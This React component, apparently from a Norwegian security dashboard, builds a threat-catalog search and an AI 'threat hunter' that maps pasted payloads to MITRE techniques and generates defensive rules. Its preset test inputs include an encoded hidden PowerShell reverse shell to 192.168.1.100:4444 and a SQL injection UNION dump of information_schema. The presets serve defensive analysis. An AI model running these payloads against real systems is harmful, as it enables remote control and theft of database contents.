import React, { useState } from 'react';
import {
  X,
  Search,
  Sparkles,
  Bot,
  Terminal,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Bug,
  Crosshair,
  Copy,
  Check,
  Code2,
  AlertTriangle,
  Zap,
  Filter,
  Layers,
  ArrowRight,
  ExternalLink,
  Cpu
} from 'lucide-react';
import { HACKER_INTEL_CATALOG, HackerIntel } from '../data/hackerIntelCatalog';

interface ThreatSearchModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSelectIntel?: (intelId: string) => void;
}

interface AiAnalysisResult {
  threatName: string;
  cve: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  mitreTactic: string;
  mitreTechnique: string;
  summary: string;
  behaviorAnalysis: string;
  indicatorsOfCompromise: string[];
  remediation: string;
  generatedDefenseRule: {
    type: 'YARA' | 'eBPF' | 'Suricata' | 'Nginx';
    filename: string;
    code: string;
    explanation: string;
  };
  aiPowered: boolean;
  source: string;
}

export const ThreatSearchModal: React.FC<ThreatSearchModalProps> = ({
  isOpen,
  onClose,
  onSelectIntel,
}) => {
  const [activeMode, setActiveMode] = useState<'catalog' | 'ai_hunter'>('catalog');
  const [catalogQuery, setCatalogQuery] = useState<string>('');
  const [categoryFilter, setCategoryFilter] = useState<string>('ALL');

  // AI Threat Hunter State
  const [aiInput, setAiInput] = useState<string>('');
  const [aiContext, setAiContext] = useState<string>('Innbruddsforsøk og mistenkelig kode i War-Room');
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [aiResult, setAiResult] = useState<AiAnalysisResult | null>(null);
  const [aiError, setAiError] = useState<string | null>(null);
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  if (!isOpen) return null;

  const catalogItems = Object.values(HACKER_INTEL_CATALOG);

  const filteredCatalog = catalogItems.filter((item) => {
    const matchesCategory =
      categoryFilter === 'ALL' || item.category === categoryFilter;

    if (!catalogQuery.trim()) return matchesCategory;

    const q = catalogQuery.toLowerCase();
    const inTitle = item.title.toLowerCase().includes(q);
    const inConcept = item.concept.toLowerCase().includes(q);
    const inRed = item.redTeamTactic.toLowerCase().includes(q);
    const inBlue = item.blueTeamDefense.toLowerCase().includes(q);
    const inCve = item.cveOrRef ? item.cveOrRef.toLowerCase().includes(q) : false;
    const inCode = item.codeSnippet ? item.codeSnippet.code.toLowerCase().includes(q) : false;

    return matchesCategory && (inTitle || inConcept || inRed || inBlue || inCve || inCode);
  });

  const handleCopy = (code: string) => {
    navigator.clipboard.writeText(code);
    setCopiedCode(code);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  const handleRunAiAnalysis = async (customQuery?: string) => {
    const queryToAnalyze = (customQuery || aiInput).trim();
    if (!queryToAnalyze) return;

    setIsAnalyzing(true);
    setAiError(null);

    try {
      const response = await fetch('/api/threat-hunt/ai-analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          query: queryToAnalyze,
          threatContext: aiContext,
        }),
      });

      if (!response.ok) {
        throw new Error(`Server svarte med status ${response.status}`);
      }

      const data = await response.json();
      setAiResult(data);
    } catch (err: any) {
      console.error('AI Threat Hunt failed:', err);
      setAiError(err.message || 'Kunne ikke fullføre AI-trusselanalysen');
    } finally {
      setIsAnalyzing(false);
    }
  };

  const aiPresets = [
    {
      label: '1. Obfuskert PowerShell Reverse Shell',
      payload: 'powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApAA==',
      context: 'Mistenkelig prosess startet fra temp-mappe'
    },
    {
      label: '2. SQL-injeksjon med Informasjonsskjema-dump',
      payload: "admin' UNION SELECT 1, column_name, table_schema, 4, 5 FROM information_schema.columns WHERE table_name='users'--",
      context: 'HTTP GET forespørsel mot /api/v1/user/profile'
    },
    {
      label: '3. Stuxnet PLS Frekvens-Manipulering',
      payload: 's7otbxsx.dll Hook: DB1.DBD20 = 1410.0 Hz (Overdrive sentrifugerotasjon mens HMI viser 1064.0 Hz normalverdi)',
      context: 'Industriell SCADA/ICS protokoll-avvik på port 102'
    },
    {
      label: '4. XZ-Utils liblzma SSH Bakdør Hook',
      payload: 'liblzma.so.5.6.0 symbol hijacking: _get_cpuid interception inside OpenSSH RSA_public_decrypt handler',
      context: 'Linux build-system kompromittert via automake/m4 makro'
    },
    {
      label: '5. Volumetrisk 100Gbps SYN-Flom DDoS',
      payload: 'Raw IP Packet: IP.src=SPOOFED_BOTNET_SUBNET IP.dst=198.51.100.1 TCP.flags=SYN TCP.seq=0xDEADBEEF len=64 rate=14.8Mpps',
      context: 'Border-ruter og kjerne-brannmur metning'
    }
  ];

  return (
    <div className="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-md flex items-center justify-center p-2 sm:p-5 animate-in fade-in duration-200">
      <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-5xl w-full max-h-[92vh] flex flex-col shadow-2xl overflow-hidden font-mono text-slate-100">
        
        {/* Header */}
        <div className="p-4 sm:p-5 border-b border-slate-800 bg-slate-950/90 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="p-2.5 rounded-xl bg-cyan-950 border border-cyan-700 text-cyan-400">
              <Search className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-base font-bold text-slate-100 tracking-wide">
                  Trussel-Søk & AI Threat Hunter
                </h2>
                <span className="text-[10px] px-2 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-800 font-bold flex items-center gap-1">
                  <Bot className="w-3 h-3 text-cyan-400" />
                  GEMINI 3.8 FLASH AKTIV
                </span>
              </div>
              <p className="text-xs text-slate-400 font-sans mt-0.5">
                Søk i den globale trussel-katalogen eller kjør sanntids AI-dypanalyse på mistenkelige payloads og sårbarheter.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            {/* Mode Switcher */}
            <div className="flex bg-slate-950 border border-slate-800 rounded-lg p-1 text-xs">
              <button
                onClick={() => setActiveMode('catalog')}
                className={`px-3 py-1.5 rounded-md font-bold transition-colors cursor-pointer flex items-center gap-1.5 ${
                  activeMode === 'catalog'
                    ? 'bg-cyan-950 border border-cyan-700 text-cyan-300'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                <Search className="w-3.5 h-3.5" />
                <span>Trussel-Katalog ({catalogItems.length})</span>
              </button>
              <button
                onClick={() => setActiveMode('ai_hunter')}
                className={`px-3 py-1.5 rounded-md font-bold transition-colors cursor-pointer flex items-center gap-1.5 ${
                  activeMode === 'ai_hunter'
                    ? 'bg-purple-950 border border-purple-700 text-purple-300 shadow-sm shadow-purple-950'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                <Sparkles className="w-3.5 h-3.5 text-purple-400" />
                <span>AI Threat Hunter</span>
              </button>
            </div>

            <button
              onClick={onClose}
              className="p-1.5 rounded-lg text-slate-400 hover:text-slate-100 hover:bg-slate-800 transition-colors cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        {/* Content Area */}
        <div className="p-4 sm:p-5 overflow-y-auto flex-1 space-y-4">
          
          {/* MODE 1: TRUSSEL-KATALOG SØK */}
          {activeMode === 'catalog' && (
            <div className="space-y-4">
              {/* Search Controls */}
              <div className="flex flex-col sm:flex-row items-center gap-3">
                <div className="relative flex-1 w-full">
                  <Search className="w-4 h-4 absolute left-3 top-3 text-slate-500" />
                  <input
                    type="text"
                    value={catalogQuery}
                    onChange={(e) => setCatalogQuery(e.target.value)}
                    placeholder="Søk etter CVE, virusnavn, angrepstaktikk, kode eller forsvarsmur..."
                    className="w-full pl-9 pr-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-cyan-500"
                  />
                  {catalogQuery && (
                    <button
                      onClick={() => setCatalogQuery('')}
                      className="absolute right-3 top-2.5 text-slate-500 hover:text-slate-300 text-xs"
                    >
                      Tøm
                    </button>
                  )}
                </div>

                {/* Category Filter Pills */}
                <div className="flex items-center gap-1.5 overflow-x-auto w-full sm:w-auto pb-1 sm:pb-0 text-[11px]">
                  {[
                    { id: 'ALL', label: 'Alle' },
                    { id: 'MALWARE', label: '☣️ Virus / Skadevare' },
                    { id: 'FIREWALL_DEFENSE', label: '🛡️ Murer / Forsvar' },
                    { id: 'RED_TEAM', label: '🔴 Red Team Angrep' },
                    { id: 'BLUE_TEAM', label: '🔵 Blue Team Tiltak' },
                  ].map((cat) => (
                    <button
                      key={cat.id}
                      onClick={() => setCategoryFilter(cat.id)}
                      className={`px-2.5 py-1.5 rounded-lg border font-semibold whitespace-nowrap cursor-pointer transition-colors ${
                        categoryFilter === cat.id
                          ? 'bg-cyan-950 border-cyan-700 text-cyan-300'
                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      {cat.label}
                    </button>
                  ))}
                </div>
              </div>

              {/* Quick Summary Bar */}
              <div className="flex items-center justify-between text-xs text-slate-400 font-mono">
                <span>Viser {filteredCatalog.length} av {catalogItems.length} registrerte trusler og forsvarslag</span>
                {catalogQuery && (
                  <span className="text-cyan-400">Filtrert på: "{catalogQuery}"</span>
                )}
              </div>

              {/* Catalog Results Grid */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5">
                {filteredCatalog.map((item) => (
                  <div
                    key={item.id}
                    className="p-4 rounded-xl bg-slate-950 border border-slate-800 hover:border-slate-700 transition-all space-y-2.5 flex flex-col justify-between"
                  >
                    <div className="space-y-2">
                      <div className="flex items-center justify-between gap-2">
                        <span className={`text-[10px] font-bold px-2 py-0.5 rounded border ${
                          item.category === 'MALWARE' 
                            ? 'bg-red-950 text-red-300 border-red-800'
                            : item.category === 'FIREWALL_DEFENSE'
                            ? 'bg-emerald-950 text-emerald-300 border-emerald-800'
                            : item.category === 'RED_TEAM'
                            ? 'bg-rose-950 text-rose-300 border-rose-800'
                            : 'bg-cyan-950 text-cyan-300 border-cyan-800'
                        }`}>
                          {item.category === 'MALWARE' ? '☣️ VIRUS' : item.category === 'FIREWALL_DEFENSE' ? '🛡️ MUR' : item.category === 'RED_TEAM' ? '🔴 RED TEAM' : '🔵 BLUE TEAM'}
                        </span>

                        <div className="flex items-center gap-1.5">
                          {item.cveOrRef && (
                            <span className="text-[10px] px-1.5 py-0.5 rounded bg-amber-950/80 text-amber-300 border border-amber-800 font-mono font-bold">
                              {item.cveOrRef}
                            </span>
                          )}
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-900 border border-slate-800 text-slate-400">
                            {item.level}
                          </span>
                        </div>
                      </div>

                      <h3 className="text-xs font-bold text-slate-100">{item.title}</h3>
                      <p className="text-[11px] text-slate-300 font-sans leading-relaxed">{item.concept}</p>

                      <div className="p-2 rounded bg-slate-900/80 border border-slate-800 text-[10px] space-y-1">
                        <div>
                          <strong className="text-rose-400">Angrep/Trussel: </strong>
                          <span className="text-slate-300 font-sans">{item.redTeamTactic}</span>
                        </div>
                        <div>
                          <strong className="text-emerald-400">Mottiltak/Forsvar: </strong>
                          <span className="text-slate-300 font-sans">{item.blueTeamDefense}</span>
                        </div>
                      </div>

                      {item.codeSnippet && (
                        <div className="bg-slate-900 rounded p-2 border border-slate-800 space-y-1 mt-2">
                          <div className="flex items-center justify-between text-[10px] text-cyan-300">
                            <span className="font-bold flex items-center gap-1">
                              <Code2 className="w-3 h-3 text-cyan-400" />
                              {item.codeSnippet.filename}
                            </span>
                            <button
                              onClick={() => handleCopy(item.codeSnippet!.code)}
                              className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 text-[9px] flex items-center gap-1 cursor-pointer transition-colors"
                            >
                              {copiedCode === item.codeSnippet.code ? <Check className="w-2.5 h-2.5 text-emerald-400" /> : <Copy className="w-2.5 h-2.5" />}
                              <span>{copiedCode === item.codeSnippet.code ? 'Kopiert' : 'Kopier kode'}</span>
                            </button>
                          </div>
                          <div className="max-h-24 overflow-y-auto font-mono text-[9px] text-emerald-400">
                            <pre><code>{item.codeSnippet.code}</code></pre>
                          </div>
                        </div>
                      )}
                    </div>

                    {item.terminalCommand && (
                      <div className="pt-2 border-t border-slate-800/80 flex items-center justify-between gap-2">
                        <code className="text-[10px] text-cyan-300 truncate">{item.terminalCommand}</code>
                        <button
                          onClick={() => handleCopy(item.terminalCommand!)}
                          className="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] shrink-0 cursor-pointer"
                        >
                          {copiedCode === item.terminalCommand ? 'Kopiert' : 'Kopier'}
                        </button>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* MODE 2: AI THREAT HUNTER (GEMINI 3.8 FLASH) */}
          {activeMode === 'ai_hunter' && (
            <div className="space-y-4">
              <div className="p-4 rounded-xl bg-purple-950/20 border border-purple-900/40 text-xs text-slate-300 font-sans leading-relaxed">
                <div className="flex items-center gap-2 font-mono font-bold text-purple-300 mb-1">
                  <Sparkles className="w-4 h-4 text-purple-400" />
                  Google Gemini 3.8 Flash AI Trusselanalysator & Regel-Generator
                </div>
                Skriv inn en mistenkelig streng, heksadesimal payload, shellcode, logg-linje eller sårbarhetsbeskrivelse. 
                Gemini AI utfører dyp minne- og protokollanalyse, mapper mot MITRE ATT&CK og genererer produksjonsklare forsvarskoder (YARA, eBPF XDP eller WAF).
              </div>

              {/* Input Area */}
              <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 space-y-3">
                <div>
                  <label className="block text-xs font-mono text-slate-300 mb-1.5 font-bold flex items-center justify-between">
                    <span>Mistenkelig Kode / Payload / Sårbarhet til Analyse:</span>
                    <span className="text-[10px] text-slate-500 font-normal">Støtter rå tekst, heksadump, shellcode og SQL/PowerShell</span>
                  </label>
                  <textarea
                    rows={4}
                    value={aiInput}
                    onChange={(e) => setAiInput(e.target.value)}
                    placeholder="Lim inn payload her, f.eks. powershell -enc ..., SELECT ... UNION, eller beskriv et angrep..."
                    className="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 font-mono text-xs text-slate-100 placeholder:text-slate-600 focus:outline-none focus:border-purple-500"
                  />
                </div>

                <div className="flex flex-col sm:flex-row items-center justify-between gap-3">
                  <div className="w-full sm:w-2/3">
                    <span className="text-[11px] text-slate-400 font-mono block mb-1">Eller velg en test-payload:</span>
                    <div className="flex flex-wrap gap-1.5">
                      {aiPresets.map((preset, idx) => (
                        <button
                          key={idx}
                          onClick={() => {
                            setAiInput(preset.payload);
                            setAiContext(preset.context);
                          }}
                          className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 border border-slate-800 text-[10px] text-slate-300 cursor-pointer transition-colors"
                        >
                          {preset.label}
                        </button>
                      ))}
                    </div>
                  </div>

                  <button
                    onClick={() => handleRunAiAnalysis()}
                    disabled={isAnalyzing || !aiInput.trim()}
                    className="w-full sm:w-auto px-5 py-2.5 rounded-xl bg-gradient-to-r from-purple-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white font-bold font-mono text-xs flex items-center justify-center gap-2 shadow-lg shadow-purple-950 transition-all disabled:opacity-50 cursor-pointer"
                  >
                    {isAnalyzing ? (
                      <>
                        <Zap className="w-4 h-4 animate-spin text-purple-200" />
                        <span>Kjører AI-Analyse...</span>
                      </>
                    ) : (
                      <>
                        <Sparkles className="w-4 h-4 text-purple-200" />
                        <span>Analyser med Gemini AI</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {aiError && (
                <div className="p-3 rounded-lg bg-rose-950/60 border border-rose-800 text-rose-200 text-xs font-mono flex items-center gap-2">
                  <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0" />
                  <span>{aiError}</span>
                </div>
              )}

              {/* AI Analysis Result Display */}
              {aiResult && (
                <div className="bg-slate-950 border border-purple-900/60 rounded-xl p-4 sm:p-5 space-y-4 shadow-xl">
                  {/* Result Header */}
                  <div className="flex flex-wrap items-center justify-between gap-3 border-b border-slate-800 pb-3">
                    <div>
                      <div className="flex items-center gap-2 flex-wrap">
                        <h3 className="text-base font-bold text-slate-100 font-mono">
                          {aiResult.threatName}
                        </h3>
                        <span className={`text-[10px] font-bold px-2 py-0.5 rounded border ${
                          aiResult.severity === 'CRITICAL'
                            ? 'bg-rose-950 text-rose-300 border-rose-800 animate-pulse'
                            : aiResult.severity === 'HIGH'
                            ? 'bg-amber-950 text-amber-300 border-amber-800'
                            : 'bg-emerald-950 text-emerald-300 border-emerald-800'
                        }`}>
                          ALVORLIGHETSGRAD: {aiResult.severity}
                        </span>
                        <span className="text-[10px] px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-cyan-300 font-mono">
                          {aiResult.cve}
                        </span>
                      </div>
                      <div className="text-xs text-slate-400 font-mono mt-1 flex items-center gap-2 flex-wrap">
                        <span>MITRE Taktikk: <strong className="text-slate-200">{aiResult.mitreTactic}</strong></span>
                        <span>•</span>
                        <span>Teknikk: <strong className="text-slate-200">{aiResult.mitreTechnique}</strong></span>
                      </div>
                    </div>

                    <span className="text-[10px] px-2 py-1 rounded bg-purple-950/80 border border-purple-800 text-purple-300 font-mono">
                      {aiResult.source}
                    </span>
                  </div>

                  {/* Summary & Behavior Grid */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
                    <div className="p-3 rounded-lg bg-slate-900/80 border border-slate-800 space-y-1">
                      <strong className="text-purple-300 block font-mono">Teknisk Sammendrag:</strong>
                      <p className="text-slate-300 font-sans leading-relaxed">{aiResult.summary}</p>
                    </div>

                    <div className="p-3 rounded-lg bg-slate-900/80 border border-slate-800 space-y-1">
                      <strong className="text-cyan-300 block font-mono">Minne- & Atferdsanalyse:</strong>
                      <p className="text-slate-300 font-sans leading-relaxed">{aiResult.behaviorAnalysis}</p>
                    </div>
                  </div>

                  {/* IOCs */}
                  {aiResult.indicatorsOfCompromise?.length > 0 && (
                    <div className="space-y-1.5">
                      <strong className="text-xs font-mono text-slate-300">Indikatorer på Kompromittering (IOC):</strong>
                      <div className="flex flex-wrap gap-2">
                        {aiResult.indicatorsOfCompromise.map((ioc, idx) => (
                          <span
                            key={idx}
                            className="text-[10px] px-2.5 py-1 rounded-md bg-slate-900 border border-slate-800 text-amber-300 font-mono"
                          >
                            ⚠️ {ioc}
                          </span>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Blue Team Remediation */}
                  <div className="p-3 rounded-lg bg-emerald-950/20 border border-emerald-900/40 text-xs font-sans space-y-1">
                    <strong className="text-emerald-400 font-mono block">Anbefalt Blue Team Remediation:</strong>
                    <p className="text-slate-300">{aiResult.remediation}</p>
                  </div>

                  {/* Generated Defensive Rule (Complete Code) */}
                  {aiResult.generatedDefenseRule && (
                    <div className="space-y-2 pt-2 border-t border-slate-800">
                      <div className="flex items-center justify-between flex-wrap gap-2">
                        <div className="flex items-center gap-2">
                          <Code2 className="w-4 h-4 text-cyan-400" />
                          <span className="text-xs font-bold text-slate-200 font-mono">
                            Autonomt Generert Forsvarsregel: {aiResult.generatedDefenseRule.filename}
                          </span>
                        </div>
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] px-2 py-0.5 rounded bg-cyan-950 border border-cyan-800 text-cyan-300 font-mono">
                            {aiResult.generatedDefenseRule.type}
                          </span>
                          <button
                            onClick={() => handleCopy(aiResult.generatedDefenseRule.code)}
                            className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-mono flex items-center gap-1.5 cursor-pointer transition-colors shadow"
                          >
                            {copiedCode === aiResult.generatedDefenseRule.code ? (
                              <>
                                <Check className="w-3.5 h-3.5 text-emerald-400" />
                                <span className="text-emerald-400">Kopiert!</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-3.5 h-3.5" />
                                <span>Kopier Kode</span>
                              </>
                            )}
                          </button>
                        </div>
                      </div>

                      <p className="text-[11px] text-slate-400 font-sans">
                        {aiResult.generatedDefenseRule.explanation}
                      </p>

                      <div className="bg-slate-900 rounded-lg p-3 border border-slate-800">
                        <pre className="text-xs text-emerald-400 font-mono overflow-x-auto leading-relaxed">
                          <code>{aiResult.generatedDefenseRule.code}</code>
                        </pre>
                      </div>
                    </div>
                  )}

                </div>
              )}
            </div>
          )}

        </div>

        {/* Footer */}
        <div className="p-4 border-t border-slate-800 bg-slate-950 flex items-center justify-between text-xs text-slate-400 font-mono">
          <div className="flex items-center gap-2">
            <span className="inline-block w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
            <span>Gemini AI Server Proxy Aktiv på /api/threat-hunt/ai-analyze</span>
          </div>
          <button
            onClick={onClose}
            className="px-4 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 font-semibold transition-colors cursor-pointer"
          >
            Lukk Trussel-Søk
          </button>
        </div>

      </div>
    </div>
  );
};
